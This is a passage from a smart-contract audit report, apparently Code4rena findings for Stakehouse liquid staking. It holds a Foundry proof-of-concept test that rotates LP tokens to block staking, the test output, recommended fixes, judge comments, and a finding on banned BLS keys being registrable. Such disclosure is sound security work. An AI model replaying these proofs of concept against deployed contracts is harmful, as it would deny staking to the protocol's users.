keys</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">\t</span><span class=\"mtk11\">MockAccountManager</span><span class=\"mtk1\">(</span><span class=\"mtk12\">factory</span><span class=\"mtk1\">.</span><span class=\"mtk11\">accountMan</span><span class=\"mtk1\">()).</span><span class=\"mtk11\">setLifecycleStatus</span><span class=\"mtk1\">(</span><span class=\"mtk12\">blsPubKeyOne</span><span class=\"mtk1\">, </span><span class=\"mtk7\">1</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">\t</span><span class=\"mtk11\">MockAccountManager</span><span class=\"mtk1\">(</span><span class=\"mtk12\">factory</span><span class=\"mtk1\">.</span><span class=\"mtk11\">accountMan</span><span class=\"mtk1\">()).</span><span class=\"mtk11\">setLifecycleStatus</span><span class=\"mtk1\">(</span><span class=\"mtk12\">blsPubKeyTwo</span><span class=\"mtk1\">, </span><span class=\"mtk7\">1</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">\t</span><span class=\"mtk3\">// deposit 4 ETH for public key one and public key two</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">\t</span><span class=\"mtk12\">StakingFundsVault</span><span class=\"mtk1\"> </span><span class=\"mtk12\">stakingFundsVault</span><span class=\"mtk1\"> = </span><span class=\"mtk12\">manager</span><span class=\"mtk1\">.</span><span class=\"mtk11\">stakingFundsVault</span><span class=\"mtk1\">();</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">\t</span><span class=\"mtk12\">stakingFundsVault</span><span class=\"mtk1\">.</span><span class=\"mtk12\">depositETHForStaking</span><span class=\"mtk1\">{value: </span><span class=\"mtk7\">4</span><span class=\"mtk1\"> </span><span class=\"mtk12\">ether</span><span class=\"mtk1\">}(</span><span class=\"mtk12\">blsPubKeyOne</span><span class=\"mtk1\">, </span><span class=\"mtk7\">4</span><span class=\"mtk1\"> </span><span class=\"mtk12\">ether</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">\t</span><span class=\"mtk12\">stakingFundsVault</span><span class=\"mtk1\">.</span><span class=\"mtk12\">depositETHForStaking</span><span class=\"mtk1\">{value: </span><span class=\"mtk7\">4</span><span class=\"mtk1\"> </span><span class=\"mtk12\">ether</span><span class=\"mtk1\">}(</span><span class=\"mtk12\">blsPubKeyTwo</span><span class=\"mtk1\">, </span><span class=\"mtk7\">4</span><span class=\"mtk1\"> </span><span class=\"mtk12\">ether</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">\t</span><span class=\"mtk3\">// to bypass the error: &quot;Liquidity is still fresh&quot;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">\t</span><span class=\"mtk12\">vm</span><span class=\"mtk1\">.</span><span class=\"mtk11\">warp</span><span class=\"mtk1\">(</span><span class=\"mtk7\">1</span><span class=\"mtk1\"> </span><span class=\"mtk12\">days</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">\t</span><span class=\"mtk3\">// rotate staking amount from public key one to public key two</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">\t</span><span class=\"mtk3\">// LP total supply for public key two exceed 4 ETHER</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">\t</span><span class=\"mtk12\">LPToken</span><span class=\"mtk1\"> </span><span class=\"mtk12\">LPTokenForPubKeyOne</span><span class=\"mtk1\"> = </span><span class=\"mtk12\">manager</span><span class=\"mtk1\">.</span><span class=\"mtk11\">stakingFundsVault</span><span class=\"mtk1\">().</span><span class=\"mtk11\">lpTokenForKnot</span><span class=\"mtk1\">(</span><span class=\"mtk12\">blsPubKeyOne</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">\t</span><span class=\"mtk12\">LPToken</span><span class=\"mtk1\"> </span><span class=\"mtk12\">LPTokenForPubKeyTwo</span><span class=\"mtk1\"> = </span><span class=\"mtk12\">manager</span><span class=\"mtk1\">.</span><span class=\"mtk11\">stakingFundsVault</span><span class=\"mtk1\">().</span><span class=\"mtk11\">lpTokenForKnot</span><span class=\"mtk1\">(</span><span class=\"mtk12\">blsPubKeyTwo</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">\t</span><span class=\"mtk12\">stakingFundsVault</span><span class=\"mtk1\">.</span><span class=\"mtk11\">rotateLPTokens</span><span class=\"mtk1\">(</span><span class=\"mtk12\">LPTokenForPubKeyOne</span><span class=\"mtk1\">, </span><span class=\"mtk12\">LPTokenForPubKeyTwo</span><span class=\"mtk1\">, </span><span class=\"mtk7\">4</span><span class=\"mtk1\"> </span><span class=\"mtk12\">ether</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">\t</span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">totalSupply</span><span class=\"mtk1\"> = </span><span class=\"mtk12\">LPTokenForPubKeyTwo</span><span class=\"mtk1\">.</span><span class=\"mtk11\">totalSupply</span><span class=\"mtk1\">();</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">\t</span><span class=\"mtk10\">console</span><span class=\"mtk1\">.</span><span class=\"mtk11\">log</span><span class=\"mtk1\">(</span><span class=\"mtk8\">&quot;total supply of the Staking fund LP exists 4 ETHER.&quot;</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">\t</span><span class=\"mtk10\">console</span><span class=\"mtk1\">.</span><span class=\"mtk11\">log</span><span class=\"mtk1\">(</span><span class=\"mtk12\">totalSupply</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">\t</span><span class=\"mtk3\">// calling TestUtils.sol#stakeSingleBlsPubKey, revert</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">\t</span><span class=\"mtk11\">stakeSingleBlsPubKey</span><span class=\"mtk1\">(</span><span class=\"mtk12\">blsPubKeyTwo</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">}</span></span></span></code></pre>\n<p>We run the POC:</p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"102\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk12\">forge</span><span class=\"mtk1\"> </span><span class=\"mtk12\">test</span><span class=\"mtk1\"> -</span><span class=\"mtk12\">vv</span><span class=\"mtk1\"> --</span><span class=\"mtk12\">match</span><span class=\"mtk1\"> </span><span class=\"mtk12\">test_rotateLP_Exceed_maxStakingAmountPerValidator_POC</span></span></span></code></pre>\n<p>the output is:</p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"103\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk12\">Running</span><span class=\"mtk1\"> </span><span class=\"mtk7\">1</span><span class=\"mtk1\"> </span><span class=\"mtk12\">test</span><span class=\"mtk1\"> </span><span class=\"mtk12\">for</span><span class=\"mtk1\"> </span><span class=\"mtk12\">test</span><span class=\"mtk1\">/</span><span class=\"mtk12\">foundry</span><span class=\"mtk1\">/</span><span class=\"mtk12\">LiquidStakingManager</span><span class=\"mtk1\">.</span><span class=\"mtk12\">t</span><span class=\"mtk1\">.</span><span class=\"mtk12\">sol</span><span class=\"mtk1\">:</span><span class=\"mtk12\">LiquidStakingManagerTests</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">[</span><span class=\"mtk12\">FAIL</span><span class=\"mtk1\">. </span><span class=\"mtk12\">Reason</span><span class=\"mtk1\">: </span><span class=\"mtk12\">DAO</span><span class=\"mtk1\"> </span><span class=\"mtk12\">staking</span><span class=\"mtk1\"> </span><span class=\"mtk12\">funds</span><span class=\"mtk1\"> </span><span class=\"mtk12\">vault</span><span class=\"mtk1\"> </span><span class=\"mtk12\">balance</span><span class=\"mtk1\"> </span><span class=\"mtk12\">must</span><span class=\"mtk1\"> </span><span class=\"mtk12\">be</span><span class=\"mtk1\"> </span><span class=\"mtk12\">at</span><span class=\"mtk1\"> </span><span class=\"mtk12\">least</span><span class=\"mtk1\"> </span><span class=\"mtk7\">4</span><span class=\"mtk1\"> </span><span class=\"mtk12\">ether</span><span class=\"mtk1\">] </span><span class=\"mtk11\">test_rotateLP_Exceed_maxStakingAmountPerValidator_POC</span><span class=\"mtk1\">() (</span><span class=\"mtk12\">gas</span><span class=\"mtk1\">: </span><span class=\"mtk7\">1510454</span><span class=\"mtk1\">)</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">Logs:</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">  total supply of the Staking fund LP exists 4 ETHER.</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">  8000000000000000000</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">Test result: FAILED. 0 passed; 1 failed; finished in 15.73ms</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">Failing tests:</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">Encountered 1 failing test in test/foundry/LiquidStakingManager.t.sol:LiquidStakingManagerTests</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">[FAIL. Reason: DAO staking funds vault balance must be at least 4 ether] test_rotateLP_Exceed_maxStakingAmountPerValidator_POC() (</span><span class=\"mtk12\">gas</span><span class=\"mtk1\">: </span><span class=\"mtk7\">1510454</span><span class=\"mtk1\">)</span></span></span></code></pre>\n<p>the total supply of the LP exceeds 4 ETH and the transaction precisely reverts in:</p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"104\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk11\">require</span><span class=\"mtk1\">(</span><span class=\"mtk12\">stakingFundsLP</span><span class=\"mtk1\">.</span><span class=\"mtk11\">totalSupply</span><span class=\"mtk1\">() == </span><span class=\"mtk7\">4</span><span class=\"mtk1\"> </span><span class=\"mtk12\">ether</span><span class=\"mtk1\">, </span><span class=\"mtk8\">&quot;DAO staking funds vault balance must be at least 4 ether&quot;</span><span class=\"mtk1\">);</span></span></span></code></pre>\n<h3 id=\"tools-used-20\" style=\"position:relative;\"><a href=\"#tools-used-20\" aria-label=\"tools used 20 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Tools Used</h3>\n<p>Manual Review, Foundry</p>\n<h3 id=\"recommended-mitigation-steps-30\" style=\"position:relative;\"><a href=\"#recommended-mitigation-steps-30\" aria-label=\"recommended mitigation steps 30 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Recommended Mitigation Steps</h3>\n<p>We recommend the project change from</p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"105\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk11\">require</span><span class=\"mtk1\">(</span><span class=\"mtk12\">_amount</span><span class=\"mtk1\"> + </span><span class=\"mtk12\">_newLPToken</span><span class=\"mtk1\">.</span><span class=\"mtk11\">totalSupply</span><span class=\"mtk1\">() &lt;= </span><span class=\"mtk7\">24</span><span class=\"mtk1\"> </span><span class=\"mtk12\">ether</span><span class=\"mtk1\">, </span><span class=\"mtk8\">&quot;Not enough mintable tokens&quot;</span><span class=\"mtk1\">);</span></span></span></code></pre>\n<p>to</p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"106\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk11\">require</span><span class=\"mtk1\">(</span><span class=\"mtk12\">_amount</span><span class=\"mtk1\"> + </span><span class=\"mtk12\">_newLPToken</span><span class=\"mtk1\">.</span><span class=\"mtk11\">totalSupply</span><span class=\"mtk1\">() &lt;= </span><span class=\"mtk12\">maxStakingAmountPerValidator</span><span class=\"mtk1\">, </span><span class=\"mtk8\">&quot;Not enough mintable tokens&quot;</span><span class=\"mtk1\">);</span></span></span></code></pre>\n<p>and change from</p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"107\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk3\">/// @dev Check the savETH vault, staking funds vault and node runner smart wallet to ensure 32 ether required for staking has been achieved</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk4\">function</span><span class=\"mtk1\"> </span><span class=\"mtk11\">_assertEtherIsReadyForValidatorStaking</span><span class=\"mtk1\">(</span><span class=\"mtk12\">bytes</span><span class=\"mtk1\"> </span><span class=\"mtk12\">calldata</span><span class=\"mtk1\"> </span><span class=\"mtk12\">blsPubKey</span><span class=\"mtk1\">) </span><span class=\"mtk11\">internal</span><span class=\"mtk1\"> </span><span class=\"mtk11\">view</span><span class=\"mtk1\"> {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">\t</span><span class=\"mtk12\">address</span><span class=\"mtk1\"> </span><span class=\"mtk12\">associatedSmartWallet</span><span class=\"mtk1\"> = </span><span class=\"mtk12\">smartWalletOfKnot</span><span class=\"mtk1\">[</span><span class=\"mtk12\">blsPubKey</span><span class=\"mtk1\">];</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">\t</span><span class=\"mtk11\">require</span><span class=\"mtk1\">(</span><span class=\"mtk12\">associatedSmartWallet</span><span class=\"mtk1\">.</span><span class=\"mtk12\">balance</span><span class=\"mtk1\"> &gt;= </span><span class=\"mtk7\">4</span><span class=\"mtk1\"> </span><span class=\"mtk12\">ether</span><span class=\"mtk1\">, </span><span class=\"mtk8\">&quot;Smart wallet balance must be at least 4 ether&quot;</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">\t</span><span class=\"mtk12\">LPToken</span><span class=\"mtk1\"> </span><span class=\"mtk12\">stakingFundsLP</span><span class=\"mtk1\"> = </span><span class=\"mtk12\">stakingFundsVault</span><span class=\"mtk1\">.</span><span class=\"mtk11\">lpTokenForKnot</span><span class=\"mtk1\">(</span><span class=\"mtk12\">blsPubKey</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">\t</span><span class=\"mtk11\">require</span><span class=\"mtk1\">(</span><span class=\"mtk11\">address</span><span class=\"mtk1\">(</span><span class=\"mtk12\">stakingFundsLP</span><span class=\"mtk1\">) != </span><span class=\"mtk11\">address</span><span class=\"mtk1\">(</span><span class=\"mtk7\">0</span><span class=\"mtk1\">), </span><span class=\"mtk8\">&quot;No funds staked in staking funds vault&quot;</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">\t</span><span class=\"mtk11\">require</span><span class=\"mtk1\">(</span><span class=\"mtk12\">stakingFundsLP</span><span class=\"mtk1\">.</span><span class=\"mtk11\">totalSupply</span><span class=\"mtk1\">() &gt;= </span><span class=\"mtk7\">4</span><span class=\"mtk1\"> </span><span class=\"mtk12\">ether</span><span class=\"mtk1\">, </span><span class=\"mtk8\">&quot;DAO staking funds vault balance must be at least 4 ether&quot;</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">\t</span><span class=\"mtk12\">LPToken</span><span class=\"mtk1\"> </span><span class=\"mtk12\">savETHVaultLP</span><span class=\"mtk1\"> = </span><span class=\"mtk12\">savETHVault</span><span class=\"mtk1\">.</span><span class=\"mtk11\">lpTokenForKnot</span><span class=\"mtk1\">(</span><span class=\"mtk12\">blsPubKey</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">\t</span><span class=\"mtk11\">require</span><span class=\"mtk1\">(</span><span class=\"mtk11\">address</span><span class=\"mtk1\">(</span><span class=\"mtk12\">savETHVaultLP</span><span class=\"mtk1\">) != </span><span class=\"mtk11\">address</span><span class=\"mtk1\">(</span><span class=\"mtk7\">0</span><span class=\"mtk1\">), </span><span class=\"mtk8\">&quot;No funds staked in savETH vault&quot;</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">\t</span><span class=\"mtk11\">require</span><span class=\"mtk1\">(</span><span class=\"mtk12\">savETHVaultLP</span><span class=\"mtk1\">.</span><span class=\"mtk11\">totalSupply</span><span class=\"mtk1\">() &gt;= </span><span class=\"mtk7\">24</span><span class=\"mtk1\"> </span><span class=\"mtk12\">ether</span><span class=\"mtk1\">, </span><span class=\"mtk8\">&quot;KNOT must have 24 ETH in savETH vault&quot;</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">}</span></span></span></code></pre>\n<p>we change from <code>==</code> balance check to <code>>=</code>, because <code>==</code> balance check is too strict in this case.</p>\n<p><strong><a href=\"https://github.com/code-423n4/2022-11-stakehouse-findings/issues/132#issuecomment-1329494472\">vince0656 (Stakehouse) confirmed</a></strong></p>\n<p><strong><a href=\"https://github.com/code-423n4/2022-11-stakehouse-findings/issues/132#issuecomment-1332138834\">Trust (warden) commented</a>:</strong></p>\n<blockquote>\n<p>Really nice find and described beautifully. The only thing I would ask is why it is considered a HIGH risk, if the described impact is DOS of the staking function, which is a Medium level impact.</p>\n</blockquote>\n<p><strong><a href=\"https://github.com/code-423n4/2022-11-stakehouse-findings/issues/132#issuecomment-1332144897\">LSDan (judge) decreased severity to Medium and commented</a>:</strong></p>\n<blockquote>\n<p>I agree with the sponsor and other wardens here. This should be medium. Great find and explanation.</p>\n</blockquote>\n<hr>\n<h2 id=\"m-11-banned-bls-public-keys-can-still-be-registered\" style=\"position:relative;\"><a href=\"#m-11-banned-bls-public-keys-can-still-be-registered\" aria-label=\"m 11 banned bls public keys can still be registered permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a><a href=\"https://github.com/code-423n4/2022-11-stakehouse-findings/issues/144\">[M-11] Banned BLS public keys can still be registered</a></h2>\n<p><em>Submitted by <a href=\"https://github.com/code-423n4/2022-11-stakehouse-findings/issues/144\">Lambda</a>, also found by <a href=\"https://github.com/code-423n4/2022-11-stakehouse-findings/issues/214\">bearonbike</a></em></p>\n<p>In <code>registerBLSPublicKeys</code>, it should be checked (according to the comment and error) if a BLS public key is part of the LSD network and not banned:</p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"108\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk3\">// check if the BLS public key is part of LSD network and is not banned</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk11\">require</span><span class=\"mtk1\">(</span><span class=\"mtk11\">isBLSPublicKeyPartOfLSDNetwork</span><span class=\"mtk1\">(</span><span class=\"mtk12\">_blsPublicKey</span><span class=\"mtk1\">) == </span><span class=\"mtk4\">false</span><span class=\"mtk1\">, </span><span class=\"mtk8\">&quot;BLS public key is banned or not a part of LSD network&quot;</span><span class=\"mtk1\">);</span></span></span></code></pre>\n<p>However, this is not actually checked. The function <code>isBLSPublicKeyPartOfLSDNetwork</code> only checks if the public key is part of the LSD network:</p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"109\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk4\">function</span><span class=\"mtk1\"> </span><span class=\"mtk11\">isBLSPublicKeyPartOfLSDNetwork</span><span class=\"mtk1\">(</span><span class=\"mtk12\">bytes</span><span class=\"mtk1\"> </span><span class=\"mtk12\">calldata</span><span class=\"mtk1\"> </span><span class=\"mtk12\">_blsPublicKeyOfKnot</span><span class=\"mtk1\">) </span><span class=\"mtk11\">public</span><span class=\"mtk1\"> </span><span class=\"mtk11\">virtual</span><span class=\"mtk1\"> </span><span class=\"mtk11\">view</span><span class=\"mtk1\"> </span><span class=\"mtk11\">returns</span><span class=\"mtk1\"> (</span><span class=\"mtk12\">bool</span><span class=\"mtk1\">) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk15\">return</span><span class=\"mtk1\"> </span><span class=\"mtk12\">smartWalletOfKnot</span><span class=\"mtk1\">[</span><span class=\"mtk12\">_blsPublicKeyOfKnot</span><span class=\"mtk1\">] != </span><span class=\"mtk11\">address</span><span class=\"mtk1\">(</span><span class=\"mtk7\">0</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">}</span></span></span></code></pre>\n<p>The function <code>isBLSPublicKeyBanned</code> would perform both checks and should be called here:</p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"110\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk4\">function</span><span class=\"mtk1\"> </span><span class=\"mtk11\">isBLSPublicKeyBanned</span><span class=\"mtk1\">(</span><span class=\"mtk12\">bytes</span><span class=\"mtk1\"> </span><span class=\"mtk12\">calldata</span><span class=\"mtk1\"> </span><span class=\"mtk12\">_blsPublicKeyOfKnot</span><span class=\"mtk1\">) </span><span class=\"mtk11\">public</span><span class=\"mtk1\"> </span><span class=\"mtk11\">virtual</span><span class=\"mtk1\"> </span><span class=\"mtk11\">view</span><span class=\"mtk1\"> </span><span class=\"mtk11\">returns</span><span class=\"mtk1\"> (</span><span class=\"mtk12\">bool</span><span class=\"mtk1\">) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk15\">return</span><span class=\"mtk1\"> !</span><span class=\"mtk11\">isBLSPublicKeyPartOfLSDNetwork</span><span class=\"mtk1\">(</span><span class=\"mtk12\">_blsPublicKeyOfKnot</span><span class=\"mtk1\">) || </span><span class=\"mtk12\">bannedBLSPublicKeys</span><span class=\"mtk1\">[</span><span class=\"mtk12\">_blsPublicKeyOfKnot</span><span class=\"mtk1\">] != </span><span class=\"mtk11\">address</span><span class=\"mtk1\">(</span><span class=\"mtk7\">0</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">}</span></span></span></code></pre>\n<p>Because of that, it is possible to pass banned BLS public keys to <code>registerBLSPublicKeys</code> and the call will succeed.</p>\n<h3 id=\"recommended-mitigation-steps-31\" style=\"position:relative;\"><a href=\"#recommended-mitigation-steps-31\" aria-label=\"recommended mitigation steps 31 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Recommended Mitigation Steps</h3>\n<p>Use <code>isBLSPublicKeyBanned</code> instead of <code>isBLSPublicKeyPartOfLSDNetwork</code>.</p>\n<p><strong><a href=\"https://github.com/code-423n4/2022-11-stakehouse-findings/issues/144#issuecomment-1329492785\">vince0656 (Stakehouse) confirmed</a></strong></p>\n<hr>\n<h2 id=\"m-12-attacker-can-grift-syndicate-staking-by-staking-a-small-amount\" style=\"position:relative;\"><a href=\"#m-12-attacker-can-grift-syndicate-staking-by-staking-a-small-amount\" aria-label=\"m 12 attacker can grift syndicate staking by staking a small amount permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a><a href=\"https://github.com/code-423n4/2022-11-stakehouse-findings/issues/146\">[M-12] Attacker can grift syndicate staking by staking a small amount</a></h2>\n<p><em>Submitted by <a href=\"https://github.com/code-423n4/2022-11-stakehouse-findings/issues/146\">Lambda</a></em></p>\n<p><a href=\"https://github.com/code-423n4/2022-11-stakehouse/blob/a0558ed7b12e1ace1fe5c07970c7fc07eb00eebd/contracts/liquid-staking/LiquidStakingManager.sol#L882\">https://github.com/code-423n4/2022-11-stakehouse/blob/a0558ed7b12e1ace1fe5c07970c7fc07eb00eebd/contracts/liquid-staking/LiquidStakingManager.sol#L882</a><br>\n<a href=\"https://github.com/code-423n4/2022-11-stakehouse/blob/23c3cf65975cada7fd2255a141b359a6b31c2f9c/contracts/syndicate/Syndicate.sol#L22\">https://github.com/code-423n4/2022-11-stakehouse/blob/23c3cf65975cada7fd2255a141b359a6b31c2f9c/contracts/syndicate/Syndicate.sol#L22</a></p>\n<p><code>LiquidStakingManager._autoStakeWithSyndicate</code> always stakes a fixed amount of 12 